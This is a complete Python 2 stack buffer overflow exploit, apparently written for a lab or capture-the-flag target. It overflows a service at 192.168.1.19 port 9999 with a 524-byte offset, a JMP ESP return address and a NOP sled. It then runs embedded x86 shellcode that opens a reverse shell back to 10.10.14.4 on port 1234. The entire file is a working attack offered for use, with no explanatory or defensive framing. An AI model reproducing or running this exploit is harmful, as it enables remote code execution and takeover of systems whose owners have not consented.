#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#ADD PAYLOAD BELOW

buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += b"\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a"
buf += b"\x0a\x0e\x04\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50"
buf += b"\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
buf += b"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
buf += b"\x0b\xcd\x80"


# JMP ESP = Value converted in Little endian format below + NOP SLED added 20 
# JMP ESP Value = 311712F3

buffer = 'A'*524 + "\xF3\x12\x17\x31" + '\x90'*20 + buf 

try:
    print "\n Sending Malicious Code to Buffer..."
    s.connect(('192.168.1.19', 9999))
    data = s.recv(100)
    s.send(buffer + '\r\n')
    print "\nBuffer Overflowed"

except:
    print "Could not connect to application"
